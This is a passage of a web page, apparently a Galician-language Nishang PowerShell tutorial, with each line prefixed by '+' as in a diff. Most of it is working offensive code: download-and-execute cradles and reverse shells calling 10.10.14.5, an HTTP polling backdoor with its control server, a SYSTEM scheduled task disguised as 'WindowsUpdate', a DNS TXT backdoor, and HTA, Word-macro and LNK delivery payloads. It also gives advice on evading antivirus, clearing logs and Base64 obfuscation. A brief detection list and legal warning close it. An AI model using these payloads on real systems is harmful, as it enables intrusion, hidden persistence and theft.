+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.5/Backdoors/HTTP-Backdoor.ps1&#39;</span><span class="p">)</span>
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>
+</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a><span class="c"># Configurar backdoor que chequea periodicamente</span>
+</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a><span class="n">HTTP-Backdoor</span> <span class="n">-CheckURL</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">5</span><span class="p">/</span><span class="n">check</span> <span class="n">-PayloadURL</span> <span class="n">http</span><span class="p">://</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">5</span><span class="p">/</span><span class="n">execute</span> <span class="n">-MagicString</span> <span class="s2">&quot;ExecuteNow&quot;</span> <span class="n">-StopString</span> <span class="s2">&quot;StopBackdoor&quot;</span>
+</span></code></pre></div>
+<p><strong>Servidor de control no Kali:</strong>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="c1"># Ficheiro &quot;check&quot; (responde ao polling)</span>
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;ExecuteNow&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>/var/www/html/check
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="c1"># Ficheiro &quot;execute&quot; (payload a executar)</span>
+</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>cat<span class="w"> </span>&gt;<span class="w"> </span>/var/www/html/execute<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a><span class="s">IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.5/Shells/Invoke-PowerShellTcp.ps1&#39;)</span>
+</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a><span class="s">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444</span>
+</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a><span class="s">EOF</span>
+</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a>
+</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a><span class="c1"># Iniciar servidor web</span>
+</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a><span class="nb">cd</span><span class="w"> </span>/var/www/html
+</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</span></code></pre></div></p>
+<h4 id="opcion-c-tarea-programada-desde-ficheiro-local">Opción C: Tarea Programada (Desde ficheiro local)</h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="c"># Crear script de payload</span>
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="nv">$payload</span> <span class="p">=</span> <span class="sh">@&#39;</span>
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="sh">IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.5/shell.ps1&#39;)</span>
+</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a><span class="sh">&#39;@</span>
+</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a><span class="nv">$payload</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">update</span><span class="p">.</span><span class="n">ps1</span>
+</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a>
+</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a><span class="c"># Crear tarea programada que se executa ao inicio</span>
+</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a><span class="nv">$action</span> <span class="p">=</span> <span class="nb">New-ScheduledTaskAction</span> <span class="n">-Execute</span> <span class="s2">&quot;powershell.exe&quot;</span> <span class="n">-Argument</span> <span class="s2">&quot;-ep bypass -nop -w hidden -f C:\Windows\Temp\update.ps1&quot;</span>
+</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a><span class="nv">$trigger</span> <span class="p">=</span> <span class="nb">New-ScheduledTaskTrigger</span> <span class="n">-AtStartup</span>
+</span><span id="__span-53-10"><a id="__codelineno-53-10" name="__codelineno-53-10" href="#__codelineno-53-10"></a><span class="nv">$principal</span> <span class="p">=</span> <span class="nb">New-ScheduledTaskPrincipal</span> <span class="n">-UserId</span> <span class="s2">&quot;SYSTEM&quot;</span> <span class="n">-LogonType</span> <span class="n">ServiceAccount</span> <span class="n">-RunLevel</span> <span class="n">Highest</span>
+</span><span id="__span-53-11"><a id="__codelineno-53-11" name="__codelineno-53-11" href="#__codelineno-53-11"></a><span class="nb">Register-ScheduledTask</span> <span class="n">-TaskName</span> <span class="s2">&quot;WindowsUpdate&quot;</span> <span class="n">-Action</span> <span class="nv">$action</span> <span class="n">-Trigger</span> <span class="nv">$trigger</span> <span class="n">-Principal</span> <span class="nv">$principal</span>
+</span><span id="__span-53-12"><a id="__codelineno-53-12" name="__codelineno-53-12" href="#__codelineno-53-12"></a>
+</span><span id="__span-53-13"><a id="__codelineno-53-13" name="__codelineno-53-13" href="#__codelineno-53-13"></a><span class="c"># Verificar</span>
+</span><span id="__span-53-14"><a id="__codelineno-53-14" name="__codelineno-53-14" href="#__codelineno-53-14"></a><span class="nb">Get-ScheduledTask</span> <span class="n">-TaskName</span> <span class="s2">&quot;WindowsUpdate&quot;</span>
+</span><span id="__span-53-15"><a id="__codelineno-53-15" name="__codelineno-53-15" href="#__codelineno-53-15"></a>
+</span><span id="__span-53-16"><a id="__codelineno-53-16" name="__codelineno-53-16" href="#__codelineno-53-16"></a><span class="c"># Eliminar cando remates</span>
+</span><span id="__span-53-17"><a id="__codelineno-53-17" name="__codelineno-53-17" href="#__codelineno-53-17"></a><span class="nb">Unregister-ScheduledTask</span> <span class="n">-TaskName</span> <span class="s2">&quot;WindowsUpdate&quot;</span> <span class="n">-Confirm</span><span class="p">:</span><span class="nv">$false</span>
+</span></code></pre></div>
+<h4 id="opcion-d-dns-txt-backdoor-sigiloso">Opción D: DNS TXT Backdoor (Sigiloso)</h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="c"># Descarga</span>
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.10.14.5/Backdoors/DNS_TXT_Pwnage.ps1&#39;</span><span class="p">)</span>
+</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>
+</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="c"># Configurar (require control dun dominio DNS)</span>
+</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a><span class="n">DNS_TXT_Pwnage</span> <span class="n">-startdomain</span> <span class="n">start</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span> <span class="n">-cmdstring</span> <span class="n">cmd</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span> <span class="n">-subdomains</span> <span class="n">-AuthNS</span> <span class="n">ns1</span><span class="p">.</span><span class="n">example</span><span class="p">.</span><span class="n">com</span>
+</span></code></pre></div>
+<h2 id="tecnicas-de-entrega">Técnicas de Entrega</h2>
+<h3 id="via-hta-html-application">Vía HTA (HTML Application)</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a><span class="p">&lt;</span><span class="nt">script</span> <span class="na">language</span><span class="o">=</span><span class="s">&quot;VBScript&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a><span class="w">  </span><span class="nb">Set</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CreateObject</span><span class="p">(</span><span class="s2">&quot;Wscript.Shell&quot;</span><span class="p">)</span>
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a><span class="w">  </span><span class="nx">shell</span><span class="p">.</span><span class="nx">run</span><span class="w"> </span><span class="s2">&quot;powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.5/shell.ps1&#39;)&quot;</span>
+</span><span id="__span-55-4"><a id="__codelineno-55-4" name="__codelineno-55-4" href="#__codelineno-55-4"></a><span class="w">  </span><span class="nb">window</span><span class="p">.</span><span class="nx">close</span><span class="p">()</span>
+</span><span id="__span-55-5"><a id="__codelineno-55-5" name="__codelineno-55-5" href="#__codelineno-55-5"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="via-macro-de-word">Vía Macro de Word</h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>Sub AutoOpen()
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>  Dim objShell As Object
+</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>  Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
+</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a>  objShell.Run &quot;powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.5/shell.ps1&#39;)&quot;, 0
+</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a>End Sub
+</span></code></pre></div>
+<h3 id="via-lnk-acceso-directo">Vía LNK (Acceso Directo)</h3>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="nv">$objShell</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-ComObject</span> <span class="n">WScript</span><span class="p">.</span><span class="n">Shell</span>
+</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="nv">$lnk</span> <span class="p">=</span> <span class="nv">$objShell</span><span class="p">.</span><span class="n">CreateShortcut</span><span class="p">(</span><span class="s2">&quot;C:\Users\Public\Desktop\Update.lnk&quot;</span><span class="p">)</span>
+</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">TargetPath</span> <span class="p">=</span> <span class="s2">&quot;powershell.exe&quot;</span>
+</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">Arguments</span> <span class="p">=</span> <span class="s2">&quot;-ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.5/shell.ps1&#39;)&quot;</span>
+</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a><span class="nv">$lnk</span><span class="p">.</span><span class="n">Save</span><span class="p">()</span>
+</span></code></pre></div>
+<h2 id="mellores-practicas">Mellores Prácticas</h2>
+<ol>
+<li><strong>Codifica sempre os payloads</strong> usando base64 ou outros métodos</li>
+<li><strong>Usa HTTPS</strong> cando sexa posible para evadir detección de rede</li>
+<li><strong>Combina con ofuscación</strong> para evitar antivirus</li>
+<li><strong>Executa en memoria</strong> sempre que poidas (evita tocar disco)</li>
+<li><strong>Limpa os logs</strong> tras as operacións</li>
+</ol>
+<h2 id="ofuscacion-basica">Ofuscación Básica</h2>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="c"># Codificar en Base64</span>
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="nv">$command</span> <span class="p">=</span> <span class="s2">&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.5/shell.ps1&#39;)&quot;</span>
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a><span class="nv">$bytes</span> <span class="p">=</span> <span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span>
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="nv">$encodedCommand</span> <span class="p">=</span> <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">)</span>
+</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>
+</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a><span class="c"># Executar</span>
+</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a><span class="n">powershell</span> <span class="n">-EncodedCommand</span> <span class="nv">$encodedCommand</span>
+</span></code></pre></div>
+<h2 id="deteccion-e-contramedidas">Detección e Contramedidas</h2>
+<p>Como defensor, busca:</p>
+<ul>
+<li>Execucións de PowerShell con <code>-encodedcommand</code></li>
+<li>Conexións de rede desde <code>powershell.exe</code></li>
+<li>Descarga de scripts desde internet</li>
+<li>Desactivación de AMSI</li>
+<li>Modificacións de ExecutionPolicy</li>
+</ul>
+<h2 id="notas-legais-e-eticas">Notas Legais e Éticas</h2>
+<p>⚠️ <strong>AVISO CRÍTICO</strong>: Nishang é unha ferramenta moi potente que DEBE usarse EXCLUSIVAMENTE en:</p>
+<ul>
+<li>✅ Auditorías de seguridade con contrato e autorización escrita</li>
+<li>✅ Ambientes de laboratorio propios</li>
+<li>✅ Competicións CTF autorizadas</li>
+<li>✅ Formación en seguridade con permisos</li>
+</ul>
+<p>❌ <strong>PROHIBIDO</strong>:</p>
+<ul>
+<li>Usar sen autorización explícita</li>
+<li>Ataques a sistemas alleos</li>
+<li>Acceso non autorizado a datos</li>
+</ul>
+<p>O uso ilegal pode resultar en graves consecuencias legais incluíndo prisión.</p>
+<h2 id="recursos-adicionais">Recursos Adicionais</h2>
+<ul>
+<li><strong>Repositorio oficial</strong>: <a href="https://github.com/samratashok/nishang" target="_blank">https://github.com/samratashok/nishang</a></li>
+<li><strong>Blog do autor</strong>: <a href="http://www.labofapenetrationtester.com" target="_blank">http://www.labofapenetrationtester.com</a></li>
+<li><strong>Wiki</strong>: <a href="https://github.com/samratashok/nishang/wiki" target="_blank">https://github.com/samratashok/nishang/wiki</a></li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver ao principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.tabs", "navigation.tabs.sticky", "navigation.top"], "search": "../../../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado no cortapapeis", "clipboard.copy": "Copiar no cortapapeis", "search.result.more.one": "1 m\u00e1is nesta p\u00e1xina", "search.result.more.other": "# m\u00e1is nesta p\u00e1xina", "search.result.none": "Sen resultados", "search.result.one": "1 resultado atopado", "search.result.other": "# resultados atopados", "search.result.placeholder": "Insira un termo", "search.result.term.missing": "Falta", "select.version": "Seleccionar version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../../../js/medium-zoom.min.js"></script>
+      
+        <script src="../../../../js/opera.js"></script>
+      
+        <script src="../../../../js/zoom.js"></script>
+      
+    
+  </body>
+</html>
